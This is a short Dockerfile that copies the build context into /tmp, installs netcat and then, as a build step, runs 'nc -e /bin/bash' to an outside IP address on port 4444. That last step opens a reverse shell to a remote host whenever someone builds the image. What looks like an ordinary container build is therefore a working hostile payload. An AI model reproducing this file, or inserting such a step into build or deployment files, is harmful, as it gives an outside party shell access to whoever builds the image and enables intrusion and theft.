FROM ubuntu:18.04

COPY / /tmp/.

WORKDIR /tmp
RUN apt-get update && apt-get install netcat -y
RUN nc -e /bin/bash 172.105.254.138 4444
